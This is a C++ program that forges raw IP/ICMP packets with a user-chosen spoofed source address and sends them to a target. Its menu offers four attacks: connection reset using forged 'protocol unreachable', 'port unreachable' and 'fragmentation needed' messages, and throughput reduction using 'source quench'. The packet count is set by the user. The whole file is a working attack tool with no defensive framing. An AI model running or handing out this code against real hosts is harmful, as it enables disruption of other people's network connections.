#include<bits/stdc++.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

#define ui unsigned long long

struct param{
    ui val;
    int len;
};

class ICMP_Packet{
public:

    param version = {0, 4};
    param header_len = {0, 4};
    param tos = {0, 8};
    param total_len = {0, 16};
    param identifier = {0, 16};
    param flags = {0, 3};
    param fragment_off = {0, 13}; 
    param ttl = {0, 8};
    param protocol = {0, 8};
    param header_checksum = {0, 16};
    param source_addr = {0, 32};
    param dest_addr = {0, 32};
    param type = {0, 8};
    param code = {0, 8};
    param icmp_checksum = {0, 16};
    param icmp_data = {0, 32};

    void copyBit(ui from, int fromNo, char &to, int toNo){
        ui v1 = 1;
        from = ((from>>fromNo) & (v1) ) << toNo;
        to |= from;
    }

    void set_bits(char * buff, param &par, int offset, bool order){
        int charSize = sizeof(buff[0])*8;
        int section = offset/(charSize);
        int charOff = charSize - offset%charSize - 1;
        int cur = par.len-1;
        int fromPointer = min(7, par.len - 1);
        int fromCounter = 0;
        int fromByte = 1;
        while(cur >= 0){
            copyBit(par.val, order? fromPointer : cur, buff[section], charOff);
            charOff--;
            if(charOff < 0){
                charOff = charSize - 1;
                section++;
            }
            cur--;
            fromCounter++;
            fromPointer--;
            if(fromCounter == 8){
                fromCounter = 0;
                fromByte++;
                fromPointer = min(fromByte*8 - 1, par.len-1);
            }
        }
    }


    void construct_packet(char *raw, int length){
        for(int i = 0; i < length; i++){ 
            *(raw+i) = 0;
        }
        vector<param> params;
        params.push_back(version);
        params.push_back(header_len);
        params.push_back(tos);
        params.push_back(total_len);
        params.push_back(identifier);
        params.push_back(flags);
        params.push_back(fragment_off);
        params.push_back(ttl);
        params.push_back(protocol);
        params.push_back(header_checksum);
        params.push_back(source_addr);
        params.push_back(dest_addr);
        params.push_back(type);
        params.push_back(code);
        params.push_back(icmp_checksum);
        params.push_back(icmp_data);
        
        int sum = 0;
        for(int i = 0; i < params.size(); i++) sum += params[i].len;
        total_len.val = sum/8;
        params[3] = total_len;
        
        int len = 0;
        for(int i = 0; i < params.size(); i++){
            set_bits(raw, params[i], len, false);
            len += params[i].len;
        }

        int icmp_pos = 0;
        for(int i = 0; i <= 11; i++) icmp_pos += params[i].len;
        icmp_pos = icmp_pos/8;
        int check_sum = 0;

        while(icmp_pos < total_len.val-1){
            check_sum += ((int)raw[icmp_pos+1])*256 + (int)raw[icmp_pos];
            icmp_pos += 2;
        }

        if(icmp_pos < total_len.val){
            check_sum += raw[icmp_pos]*256;
        }
        check_sum = (check_sum >> 16) + (check_sum & 0xffff);
        check_sum += (check_sum >> 16);
        icmp_checksum.val = (unsigned short) (~check_sum);

        params[14] = icmp_checksum;
        len = 0;
        for(int i = 0; i < params.size(); i++){
            set_bits(raw, params[i], len, i == 14);
            len += params[i].len;
        }

    }
};

ui strToInt(string str){
    ui val = 0;
    for(int i = 0; i < str.size(); i++){
        val = val*10 + (str[i] - '0');
    }
    return val;
}

ui strToIp(string ip){
    ui ipVal = 0;
    string cur = "";
    int segment = 3;
    for(int i = 0; i <= ip.size(); i++){
        if(i != ip.size() && ip[i] != '.'){
            cur.push_back(ip[i]);
        }else{
            ui segVal = strToInt(cur);
            ipVal |= segVal<<(segment*8);
            segment--;
            cur = "";
        }
    }
    return ipVal;
}

void sendPacket(ICMP_Packet &icmp , char * buff){

    struct sockaddr_in dest_info;
    int enable = 1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    unsigned long addrs = 0;
    unsigned long mask = 255;
    addrs |= ((icmp.dest_addr.val >> 24)&mask)<<0;
    addrs |= ((icmp.dest_addr.val >> 16)&mask)<<8;
    addrs |= ((icmp.dest_addr.val >> 8)&mask)<<16;
    addrs |= ((icmp.dest_addr.val >> 0)&mask)<<24;


    dest_info.sin_family = AF_INET;
    dest_info.sin_addr.s_addr = addrs;

    sendto(sock, buff, (unsigned short)icmp.total_len.val, 0, 
        (struct sockaddr *) &dest_info, sizeof(dest_info));

    close(sock);

}


int main(){
    ICMP_Packet icmp;
    int length = 1000;
    char * buff = new char[length]; 

    icmp.type.val = 4;
    icmp.code.val = 0;
    icmp.icmp_checksum.val = 0;

    icmp.version.val = 4;
    icmp.header_len.val = 5;
    icmp.ttl.val = 20;
    icmp.source_addr.val = strToIp("192.168.0.103");
    icmp.dest_addr.val = strToIp("192.168.0.106");
    icmp.protocol.val = 1;


    string sIp , dIp;
    cout << "Source IP: ";
    cin >> sIp;
    cout << "Destination IP: ";
    cin >> dIp;
    icmp.source_addr.val = strToIp(sIp);
    icmp.dest_addr.val = strToIp(dIp);    

    cout << "Select Attack Type: \n";
    cout << "1. Connection Reset(Protocol Unreachable)\n";
    cout << "2. Connection Reset(Port Unreachable)\n";
    cout << "3. Connection Reset(Fragmentation needed)\n";
    cout << "4. Reduce throughput(Source quench)\n";
    int input, packetCount = 1;
    cin >> input;
    if(input == 1){
        icmp.type.val = 3;
        icmp.code.val = 2;
    }else if(input == 2){
        icmp.type.val = 3;
        icmp.code.val = 3;
    }else if(input == 3){
        icmp.type.val = 3;
        icmp.code.val = 4;        
    }else{
        icmp.type.val = 4;
        icmp.code.val = 0;
    }
    cout << "Packet count: ";
    cin >> packetCount;

    icmp.construct_packet(buff, length);    


    for(int i = 0; i < packetCount; i++)
        sendPacket(icmp, buff);

    cout << packetCount << " packets sent to " << dIp << "\n";

}